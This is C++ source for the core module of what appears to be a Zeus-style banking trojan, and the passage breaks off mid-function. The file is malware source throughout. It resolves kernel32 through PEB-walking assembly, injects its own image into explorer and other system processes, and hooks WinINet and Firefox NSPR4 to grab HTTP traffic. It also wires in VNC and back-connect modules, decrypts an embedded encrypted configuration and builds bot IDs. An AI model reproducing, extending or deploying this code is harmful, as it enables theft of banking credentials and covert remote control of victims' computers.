#include <windows.h>
#include <shlobj.h>
#include <shellapi.h>
#include <sddl.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <intrin.h> 

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "coreinstall.h"
#include "coreinject.h"
#include "corecontrol.h"
#include "tcpserver.h"
#include "dynamicconfig.h"
#include "localconfig.h"
#include "localsettings.h"
#include "report.h"
#include "winapitables.h"
#include "softwaregrabber.h"
#include "backconnectbot.h"
#include "vnc\vncserver.h"
#include "httpgrabber.h"
#include "nspr4hook.h"
#include "wininethook.h"
#include "sockethook.h"
#include "certstorehook.h"
#include "userhook.h"
#include "osenv.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\peimage.h"
#include "..\common\process.h"
#include "..\common\winsecurity.h"
#include "..\common\fs.h"
#include "..\common\wsocket.h"
#include "..\common\mscab.h"
#include "..\common\sync.h"
#include "..\common\disasm.h"
#include "..\common\baseoverlay.h"
#include "..\common\comlibrary.h"
#include "..\common\xmlparser.h"
#include "..\common\wahook.h"
#include "..\common\registry.h"

COREDATA coreData;
static ThreadsGroup::GROUP servcieThreads;
extern const char baseConfigSource[sizeof(BASECONFIG)];

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// List of processes.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

typedef struct
{
  DWORD nameId;  //The name of the process, can moderzhat mask if folder == CSIDL_DESKTOP.
  DWORD rights; //Right CDPF_RIGHT_ *.
  DWORD folder; //Folder process CSIDL_. If folder == CSIDL_DESKTOP, folder can be anything.
}
PROCESSRIGHTS;

//! The code for CSIDL_DESKTOP not active!
const static PROCESSRIGHTS processRights[] =
{
  //Processes, which is present during all sessions of the user.
  {CryptedStrings::id_core_pr_dwm,      Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_taskhost, Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_taskeng,  Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_wscntfy,  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_ctfmon,   Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_rdpclip,  Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
  {CryptedStrings::id_core_pr_explorer, Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_WINDOWS},
};

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Utilities.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

#if(BO_DEBUG == 2)
  static HANDLE debugServer; //Hadley flow debyuga.

  /*
  ������� ������� �����-�������.

  Return - 0.
  */
  static DWORD WINAPI debugServerProc(void *)
  {
    CoreHook::disableFileHookerForCurrentThread(true);
    DebugClient::StartLogServer();
    return 0;
  }
#endif

/*
  ������ CWA(kernel32, GetProcAddress).
*/
static void *__GetProcAddress(HMODULE module, LPSTR name)
{
#if defined _WIN64
  PIMAGE_NT_HEADERS64 ntHeaders  = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
  PIMAGE_NT_HEADERS32 ntHeaders  = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
  PIMAGE_DATA_DIRECTORY impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  PIMAGE_EXPORT_DIRECTORY ied =  (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

  for(DWORD i = 0; i < ied->NumberOfNames; i++)
  {
    LPDWORD curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
    if(curName && Str::_CompareA(name, (LPSTR)((LPBYTE)module + *curName), -1, -1) == 0)
    {
      LPWORD pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
      curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
      return ((LPBYTE)module + *curName);
    }
  }

  return NULL;
}

/*
  ����������� ������ � ���� ������ � ������ ��������.

  IN process  - ������� ��� ���������.
  IN image    - ����� ����� ������ � process.
  IN curVa    - ������� VA ������ ��� �����������.
  IN data     - ������.
  IN dataSize - ������ ������ ��� �����������.

  Return      - true - � ������ ������,
                false - � ������ �������.
*/
static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *data, DWORD dataSize)
{
  DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
  return (CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, data, dataSize, NULL) == FALSE) ? false : true;
}

/*
  ����������� ������ � ���� ������ � ������ ��������.

  IN process - ������� ��� ���������.
  IN image   - ����� ����� ������ � process.
  IN curVa   - ������� VA ������ ��� �����������.
  IN handle  - ����� ��� �����������.

  Return     - true - � ������ ������,
               false - � ������ �������.
*/
static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE handle)
{
  HANDLE newHandle;
  DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
  
  if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, handle, process, &newHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
  {
    if(CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, &newHandle, sizeof(HANDLE), NULL) != FALSE)return true;
    CWA(kernel32, DuplicateHandle)(process, newHandle, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
  }
  return false;
}

/*
  ��������� ������ kernel32.dll.

  Return - �����.
*/
HMODULE _getKernel32Handle(void)
{
#if defined _WIN64
  return NULL; //FIXME
#else  
  __asm
  {
    cld                    //clear the direction flag for the loop
    
    mov edx, fs:[0x30]     //get a pointer to the PEB
    mov edx, [edx + 0x0C]  //get PEB-> Ldr
    mov edx, [edx + 0x14]  //get the first module from the InMemoryOrder module list
  
  next_mod:
    mov esi, [edx + 0x28]  //get pointer to modules name (unicode string)
    mov ecx, 24            //the length we want to check
    xor edi, edi           //clear edi which will store the hash of the module name
  
  loop_modname:
    xor eax, eax           //clear eax
    lodsb                  //read in the next byte of the name
    cmp al, 'a'            //some versions of Windows use lower case module names
    jl not_lowercase
    sub al, 0x20           //if so normalise to uppercase
  
  not_lowercase:
    ror edi, 13            //rotate right our hash value
    add edi, eax           //add the next byte of the name to the hash
    loop loop_modname      //loop until we have read enough
    
    cmp edi, 0x6A4ABC5B    //compare the hash with that of KERNEL32.DLL
    mov eax, [edx + 0x10]  //get this modules base address
    mov edx, [edx]         //get the next module
    jne next_mod           //if it doesn't match, process the next module
  };
#endif
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//In the Core.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  �������� ������� � �������.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initLoadModules(DWORD flags)
{
  if((coreData.modules.kernel32 = _getKernel32Handle()) == NULL)
  {
    //WDEBUG0 (WDDT_ERROR, "_getKernel32Handle () failed.");
    return false;
  }

  if((flags & Core::INITF_INJECT_START) == 0)
  {
    if((coreData.modules.current = CWA(kernel32, GetModuleHandleW)(NULL)) == NULL)return false;
  }
  else
  {
    //coreData.modules.current - updated rodetelem.

    //Update imports.
    if(!PeImage::_loadImport(coreData.modules.current, __GetProcAddress(coreData.modules.kernel32, "LoadLibraryA"), __GetProcAddress(coreData.modules.kernel32, "GetProcAddress")))return false;
  }

  //Loads ntdll.dll and desired functions.
  {
    {
      CSTR_GETW(dllName, module_ntdll);
      if((coreData.modules.ntdll = CWA(kernel32, GetModuleHandleW)(dllName)) == NULL)return false;
    }

    coreData.ntdllApi.ntCreateThread            = (ntdllNtCreateThread)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateThread");
    coreData.ntdllApi.ntCreateUserProcess       = (ntdllNtCreateUserProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateUserProcess");
    coreData.ntdllApi.ntQueryInformationProcess = (ntdllNtQueryInformationProcess)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryInformationProcess");
    coreData.ntdllApi.rtlUserThreadStart        = (void *)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "RtlUserThreadStart");
#   if(0)
    coreData.ntdllApi.ntQueryDirectoryFile      = (ntdllNtQueryDirectoryFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtQueryDirectoryFile");
#   endif
#   if defined(HOOKER_LDRLOADDLL)
    coreData.ntdllApi.ldrLoadDll                = (ntdllLdrLoadDll)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrLoadDll");
    coreData.ntdllApi.ldrGetDllHandle           = (ntdllLdrGetDllHandle)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "LdrGetDllHandle");
#   endif
#   if defined(HOOKER_NTCREATEFILE)
    coreData.ntdllApi.ntCreateFile              = (ntdllNtCreateFile)CWA(kernel32, GetProcAddress)(coreData.modules.ntdll, "NtCreateFile");
#   endif

    if((coreData.ntdllApi.ntCreateThread == NULL && coreData.ntdllApi.ntCreateUserProcess == NULL)
      || coreData.ntdllApi.ntQueryInformationProcess == NULL
#        if(0)
      || coreData.ntdllApi.ntQueryDirectoryFile == NULL
#        endif
#        if defined(HOOKER_LDRLOADDLL)
      || coreData.ntdllApi.ldrLoadDll == NULL
      || coreData.ntdllApi.ldrGetDllHandle == NULL
#        endif
#        if defined(HOOKER_NTCREATEFILE)
      || coreData.ntdllApi.ntCreateFile == NULL
#        endif
      )
    {
      return false;
    }
  }

  return true;
}

/*
  ������� ������ OS.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initOsBasic(DWORD flags)
{
  //WOW64
# if !defined _WIN64
  if((flags & Core::INITF_INJECT_START) == 0 && Process::_isWow64(CURRENT_PROCESS))coreData.proccessFlags |= Core::CDPF_WOW64;
# endif
  
  //Get a handle for access.
  if((coreData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&coreData.securityAttributes.saAllowAll, &coreData.securityAttributes.sdAllowAll)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
    return false;
  }

  //OS GUID.
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    MalwareTools::_getOsGuid(&coreData.osGuid);
  }
  else
  {
    //Preserved when you copy a module.
  }

  //Version of Windows.
  {
    coreData.winVersion = OsEnv::_getVersion();
    if(coreData.winVersion < OsEnv::VERSION_XP)
    {
      WDEBUG1(WDDT_ERROR, "Bad windows version %u.", coreData.winVersion);
      return false;
    }
  }
  
  //Getting IntegrityLevel.
  if((coreData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
  {
    if(coreData.winVersion < OsEnv::VERSION_VISTA)coreData.integrityLevel = Process::INTEGRITY_MEDIUM;
    else
    {
      WDEBUG0(WDDT_ERROR, "Unknown integrity level.");
      return false;
    }
  }
  if((flags & Core::INITF_INJECT_START) == 0 && coreData.integrityLevel < Process::INTEGRITY_MEDIUM)
  {
    WDEBUG0(WDDT_ERROR, "Bad integrity level for normal startup.");
    return false;
  }
  
  return true;
}

/*
  �������� ��������.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initHandles(DWORD flags)
{
  //Global objects.
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    coreData.globalHandles.stopEvent   = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, NULL);
    coreData.globalHandles.stopedEvent = CURRENT_PROCESS;

    if(coreData.globalHandles.stopEvent == NULL)
    {
      WDEBUG0(WDDT_ERROR, "Failed to create global handles.");
      return false;
    }
  }
  else
  {
    //Created rodielskim flow.
  }
  
  return true;
}

/*
  These tekschego user.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initUserData(DWORD flags)
{
  if((coreData.currentUser.token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &coreData.currentUser.sessionId)))
  {
    coreData.currentUser.sidLength = CWA(advapi32, GetLengthSid)(coreData.currentUser.token->User.Sid);
    coreData.currentUser.id        = Crypt::crc32Hash((LPBYTE)coreData.currentUser.token->User.Sid, coreData.currentUser.sidLength);
    WDEBUG2(WDDT_INFO, "coreData.currentUser.id=\"0x%08X\", coreData.currentUser.sessionId=\"%u\"", coreData.currentUser.id, coreData.currentUser.sessionId);
  }
  else 
  {
    WDEBUG0(WDDT_ERROR, "Process::_getProcessUserByHandle failed!");
    return false;
  }

  return true;
}

/*
  ��������� �����.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initPaths(DWORD flags)
{
  WCHAR path[MAX_PATH];

  //Obtain the home directory.
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, coreData.paths.home) != S_OK)
    {
      WDEBUG0(WDDT_ERROR, "Failed to get home path."); 
      return false;
    }
    CWA(shlwapi, PathRemoveBackslashW)(coreData.paths.home);
  }
  else
  {
    //It is saved from a parent.
  }

  //Current file.
  DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
  if((coreData.paths.process = Str::_CopyExW(path, size)) == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Not enough memory.");
    return false;
  }
  
  return true;
}

/*
  ��������� ������ ������� ������������.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initBaseConfig(DWORD flags)
{
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    void *section = PeImage::_getSectionOfModule((HMODULE)coreData.modules.current, PESECTION_OF_BASECONFIG_KEY, NULL);
    if(section == NULL)return false;
    coreData.baseConfigInfo.xorKey = (DWORD)((DWORD_PTR)section - (DWORD_PTR)coreData.modules.current);
  }
  return true;
}

/*
  Creation of object names.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initObjects(DWORD flags)
{
  //installID
  if((flags & Core::INITF_INJECT_START) == 0)
  {
    BASECONFIG bs;
    Core::getBaseConfig(&bs); //! The primary challenge PeCrypt:: _decryptSection ().
    MalwareTools::_generateKernelObjectName(&coreData.osGuid, Core::OBJECT_ID_BOT_STATUS, coreData.currentUser.id, coreData.installId, &bs.baseKey, MalwareTools::KON_DEFAULT);
  }
  else
  {
    //Preserved when you copy a module.
  }
  return true;
}

/*
  ��������� ���� �������� CDPF_RIGHT_*.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initProcessRights(DWORD flags)
{
  if(flags & Core::INITF_INJECT_START)
  {
    if(coreData.integrityLevel > Process::INTEGRITY_LOW)
    {
      //LPWSTR fileName = NULL;
      WCHAR path[MAX_PATH];
      WCHAR name[CryptedStrings::len_max];

      for(DWORD i = 0; i < sizeof(processRights) / sizeof(PROCESSRIGHTS); i++)
      {
        CryptedStrings::_getW(processRights[i].nameId, name);
#       if(0)
        if(processRights[i].folder == CSIDL_DESKTOP)
        {
          if(fileName == NULL)fileName = CWA(shlwapi, PathFindFileNameW)(coreData.paths.process);
          if(CWA(shlwapi, PathMatchSpecW)(fileName, name) == TRUE)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
        else
#       endif
        {
          if(CWA(shell32, SHGetFolderPathW)(NULL, processRights[i].folder, NULL, SHGFP_TYPE_CURRENT, path) == S_OK &&
            Fs::_pathCombine(path, path, name) &&
            CWA(kernel32, lstrcmpiW)(path, coreData.paths.process) == 0)
          {
            WDEBUG1(WDDT_INFO, "Rights detected as %s.", name);
            coreData.proccessFlags |= processRights[i].rights;
            break;
          }
        }
      }
    }
  }
#if !defined _WIN64
  else if(coreData.proccessFlags & Core::CDPF_WOW64)coreData.proccessFlags |= Core::CDPF_RIGHT_ALL;
#endif

  return true;
}

/*
  Install hooks.

  IN flags - ����� INITF_*.

  Return   - true - � ������ ������,
             false - � ������ ������.
*/
static bool __inline initHooks(DWORD flags)
{
  if(flags & Core::INITF_HOOKS_FOR_USER)
  {
    WDEBUG0(WDDT_INFO, "Initializes the user modules.");    

    UserHook::init();

#   if(BO_WININET > 0 || BO_NSPR4 > 0)
    {
      HttpGrabber::init();

      //Learn prinuditilnuyu homepage.
      WCHAR homePage[max(MAX_PATH, 0xFF + 1)];
      Core::getPeSettingsPath(Core::PSP_QUICKSETTINGSFILE, homePage);
      DWORD homePageSize = Fs::_readFileToBuffer(homePage, homePage, 0xFF * sizeof(WCHAR));
      if(homePageSize == (DWORD)-1 || homePageSize % sizeof(WCHAR) != 0)homePageSize = 0;
      homePage[homePageSize / sizeof(WCHAR)] = 0;

#     if(BO_WININET > 0)
      WininetHook::init(homePage);
#     endif

#     if(BO_NSPR4 > 0)
      Nspr4Hook::init(homePage);
#     endif
    }
#   endif

#   if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
    SocketHook::init();
#   endif

    SoftwareGrabber::init();

#   if(BO_VNC > 0)
    VncServer::init();
#   endif

    //Expose the hooks.
#   if(BO_NSPR4 > 0)
    if(WinApiTables::_trySetNspr4Hooks())
    {
      CoreHook::markNspr4AsHooked();
      WDEBUG0(WDDT_INFO, "Hooks installed for nspr4.dll");
    }
#   endif
    WinApiTables::_setUserHooks();
  }

  return true;
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////

bool Core::init(DWORD flags)
{
  if((flags & INITF_INJECT_START) == 0)coreData.proccessFlags = 0;
  //else coreData.proccessFlags = 0, / / ​​updated rodetelem.

  //Obtain the handles of the main modules (dll).
  if(!initLoadModules(flags))return false;

  //Initialize the basic modules.
  Mem::init(512 * 1024);
  Crypt::init();
  CoreHook::init();
  CoreHook::disableFileHookerForCurrentThread(true);
  WSocket::init();
  
  //Preparing to debug output.
# if(BO_DEBUG > 0)
  {
    DebugClient::Init();
#   if(BO_DEBUG == 1)  
    CWA(user32, MessageBeep)(-1);
#   elif(BO_DEBUG == 2)
    debugServer = NULL;  
    if((flags & INITF_INJECT_START) == 0)debugServer = CWA(kernel32, CreateThread)(NULL, 0, debugServerProc, NULL, 0, NULL);
#   endif
    DebugClient::RegisterExceptionFilter();
  }
# endif

  //Basic data OC.
  if(!initOsBasic(flags))return false;

  //Objects.
  if(!initHandles(flags))return false;

  //These tekschego user.
  if(!initUserData(flags))return false;

  //Obtain the home directory.
  if(!initPaths(flags))return false;
  
  //PID
  coreData.pid = CWA(kernel32, GetCurrentProcessId)();

  //Zeroing UserAgent.
  coreData.httpUserAgent = NULL;
  
  if(!initBaseConfig(flags))return false;
  
  //Creation of object names.
  if(!initObjects(flags))return false;

  //Set the right process.
  if(!initProcessRights(flags))return false;

  //Initialize additional modules.
  MsCab::Init();
  Report::init();
  DynamicConfig::init();
  LocalConfig::init();
  LocalSettings::init();

  //Install hooks.
  if(!initHooks(flags))return false;

  //Deduce information about the process.
# if(BO_DEBUG > 0)
  {
    LPWSTR userSid;
    if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
    BASECONFIG baseConfig;
    getBaseConfig(&baseConfig);

    WDEBUG11(WDDT_INFO, "Initialized successfully:\r\nVersion: %u.%u.%u.%u\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\nbaseConfig hash=0x%08X",
                       VERSION_MAJOR(BO_CLIENT_VERSION),
                       VERSION_MINOR(BO_CLIENT_VERSION),
                       VERSION_SUBMINOR(BO_CLIENT_VERSION),
                       VERSION_BUILD(BO_CLIENT_VERSION),
                       coreData.integrityLevel,
                       coreData.proccessFlags,
                       coreData.paths.process,
                       CWA(kernel32, GetCommandLineW)(),
                       coreData.paths.home,
                       userSid == NULL ? L"-" : userSid,
                       Crypt::crc32Hash((LPBYTE)&baseConfig, sizeof(BASECONFIG)));

    if(userSid != NULL)CWA(kernel32, LocalFree)(userSid);
  }
# endif
  
  return true;
}

void Core::uninit(void)
{
#if(BO_DEBUG == 2)
  if(debugServer != NULL)
  {
    CWA(kerne32, WaitForSingleObject)(debugServer, INFINITE);
    CWA(kerne32, CloseHandle)(debugServer);
  }
#endif
  //... Fill in when needed, and there is no point in wasting code.
}

void Core::initHttpUserAgent(void)
{
  if(coreData.httpUserAgent == NULL)
  {
    /*
      � ������� ���� ���� ��� ������� ����� ������� �� ���������� ������� ������������,
      � ���������� ������ ������. �� �.�. ��� �� ����� � ������ ������, �� ������� ��� �����
      ����. �������. �.�. ��� ��� �� �������� ��� ������ �����, ��� � 1��.
    */
    coreData.httpUserAgent = Wininet::_GetIEUserAgent();
  }
}

void Core::initDefaultCallUrlData(Wininet::CALLURLDATA *cud)
{
  Mem::_zero(cud, sizeof(Wininet::CALLURLDATA));
  initHttpUserAgent();

  cud->bAutoProxy               = true;
  cud->bTryCount                = WININET_CONNECT_RETRY_COUNT;
  cud->dwRetryDelay             = WININET_CONNECT_RETRY_DELAY;
  cud->SendRequest_dwFlags      = Wininet::WISRF_METHOD_GET;
  cud->DownloadData_dwSizeLimit = BINSTORAGE_MAX_SIZE;
  cud->pstrUserAgent            = coreData.httpUserAgent;
}

HANDLE Core::createMutexOfProcess(DWORD pid)
{
  WCHAR objectName[50];
  BASECONFIG baseConfig;
  PESETTINGS pes;

  getBaseConfig(&baseConfig);
  getPeSettings(&pes);

  MalwareTools::_generateKernelObjectName(&coreData.osGuid, pes.processInfecionId, pid, objectName, &baseConfig.baseKey, MalwareTools::KON_GLOBAL);
  return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
}

void Core::generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace)
{
  BASECONFIG baseConfig;
  getBaseConfig(&baseConfig);
  MalwareTools::_generateKernelObjectName(&coreData.osGuid, id, coreData.currentUser.id, buffer, &baseConfig.baseKey, objectNamespace);
}

HANDLE Core::waitForMutexOfObject(DWORD id, BYTE objectNamespace)
{
  WCHAR strObject[50];
  Core::generateObjectName(id, strObject, objectNamespace);
  return  Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, strObject);
}

void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags)
{
  void *image = PeImage::_copyModuleToProcess(process, coreData.modules.current);
  if(image == NULL)return NULL;

  BYTE errorsCount = 0;
  
  //Duplicate myuteks new process in the new process.
  {
    HANDLE newMutex;
    if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, process, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
    {
      WDEBUG0(WDDT_ERROR, "Failed to duplicate mutex of process.");
      errorsCount++;
    }
  }
  
  //coreData.proccessFlags.
  proccessFlags |= (coreData.proccessFlags & CDPT_INHERITABLE_MASK);
  if(!copyDataToProcess(process, image, &coreData.proccessFlags, &proccessFlags, sizeof(DWORD)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.proccessFlags.");
    errorsCount++;
  }

  //Indicates current module.
  if(!copyDataToProcess(process, image, &coreData.modules.current, &image, sizeof(HMODULE)))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
    errorsCount++;
  }

  //coreData.globalHandles.stopEvent.
  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopEvent, coreData.globalHandles.stopEvent))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopEvent.");
    errorsCount++;
  }

  //coreData.globalHandles.stopedEvent.
  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopedEvent, coreData.globalHandles.stopedEvent))
  {
    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopedEvent.");
    errorsCount++;
  }

  //Exits with an error.
  if(errorsCount != 0)
  {
    CWA(kernel32, VirtualFreeEx)(process, image, 0, MEM_RELEASE);
    return NULL;
  }
  
  //Uspesheny vvyhod.
  return image;
}

DWORD Core::disableErrorMessages(void)
{
#if(BO_DEBUG == 0)
  return CWA(kernel32, SetErrorMode)(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
#else
  return 0;
#endif
}

void Core::replaceFunction(const void *oldFunction, const void *newFunction)
{
  void **list = (void **)&coreData.ntdllApi;
  for(DWORD i = 0; i < sizeof(coreData.ntdllApi) / sizeof(void *); i++)if(list[i] == (void *)oldFunction)list[i] = (void *)newFunction;
}

bool Core::isActive(void)
{
  return CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 0) == WAIT_OBJECT_0 ? false : true;
}

void Core::_destroyFunction(void *p)
{
  LPBYTE cur = (LPBYTE)p;
  DWORD size;

  WDEBUG1(WDDT_INFO, "Destroying function 0x%p", p);
  for(;;)
  {
    size = Disasm::_getOpcodeLength(cur);
    if(size == (DWORD)(-1) || *cur == 0xC3 || *cur == 0xC2 || *cur == 0xCB || *cur == 0xCA)break; //All kinds of ret for x32, x64
    Crypt::_generateBinaryData(cur, size, 0, 0xFF, false);
    cur += size;  
  }
  WDEBUG1(WDDT_INFO, "Destroyed %u bytes", (DWORD)(cur - (LPBYTE)p));
}

void Core::_generateBotId(LPWSTR buf)
{
  WCHAR cid[40];
  DWORD subId[2];

  //Obtain NetBIOS.
  int size = sizeof(cid) / sizeof(WCHAR);
  if(CWA(kernel32, GetComputerNameW)(cid, (LPDWORD)&size) == FALSE)CryptedStrings::_getW(CryptedStrings::id_core_botid_unknown, cid);

  //Obtain version. Here, a strong paranoia about the Mem:: _zero ().
  OSVERSIONINFOEXW ovi;
  Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
  ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
  if(CWA(kernel32, GetVersionExW)((OSVERSIONINFOW *)&ovi) == FALSE)Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
  else Mem::_zero(ovi.szCSDVersion, sizeof(ovi.szCSDVersion));

  {
    CSTR_GETW(regKey, core_botid_regkey);

    //Date of installation.
    {
      CSTR_GETW(regValue1, core_botid_regvalue_1);
      subId[0] = Registry::_getValueAsDword(HKEY_LOCAL_MACHINE, regKey, regValue1);
    }

    //Registration data.
    {
      CSTR_GETW(regValue2, core_botid_regvalue_2);
      subId[1] = Registry::_getsCrc32OfValue(HKEY_LOCAL_MACHINE, regKey, regValue2);
    }
  }

  //Create a full ID
  {
    CSTR_GETW(format, core_botid_format);
    size = Str::_sprintfW(buf, 60, format, cid, Crypt::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Crypt::crc32Hash((LPBYTE)subId, sizeof(subId)));
  }

  if(size < 1)CryptedStrings::_getW(CryptedStrings::id_core_botid_format_error, buf);
}

void Core::getBaseConfig(BASECONFIG *bc)
{
  Mem::_copy(bc, baseConfigSource, sizeof(BASECONFIG));
  LPBYTE p = (LPBYTE)coreData.modules.current + coreData.baseConfigInfo.xorKey;
  for(DWORD i = 0; i < sizeof(BASECONFIG); i++)((LPBYTE)bc)[i] ^= p[i];
}

void Core::getPeSettings(PESETTINGS *ps)
{
  BASECONFIG baseConfig;
  getBaseConfig(&baseConfig);

  Crypt::RC4KEY rc4k;
  Mem::_copy(&rc4k, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
  Mem::_copy(ps, &coreData.peSettings, sizeof(PESETTINGS));
  Crypt::_rc4(ps, sizeof(PESETTINGS), &rc4k);
}

void Core::getPeSettingsPath(DWORD type, LPWSTR path)
{
  *path = 0;

  WCHAR buf[50];
  PESETTINGS pe;
  getPeSettings(&pe);

  //Obtain baseline data.
  LPSTR source;
  LPWSTR prefix;
  switch(type)
  {
    case PSP_COREFILE:
      prefix = coreData.paths.home;
      source = pe.userPaths.coreFile;
      break;
    
    case PSP_QUICKSETTINGSFILE:
    case PSP_REPORTFILE:
      prefix = coreData.paths.home;
      source = pe.userPaths.reportFile;
      break;
    
    case PSP_REGKEY:
      prefix = PATH_REGKEY;
      source = pe.userPaths.regKey;
      break;
    
    default: return;
  }

  //Putting the path.
  if(Str::_ansiToUnicode(source, -1, buf, sizeof(buf) / sizeof(WCHAR)) != 0)
  {
    if(!Fs::_pathCombine(path, prefix, buf))*path = 0;
    else if(type == PSP_QUICKSETTINGSFILE && CWA(shlwapi, PathRenameExtensionW)(path, L".dat") == FALSE)*path = 0;
  }
}

void Core::getRegistryValue(DWORD type, LPWSTR key, LPWSTR value)
{
  PESETTINGS pe;
  LPSTR source;

  getPeSettings(&pe);

  switch(type)
  {
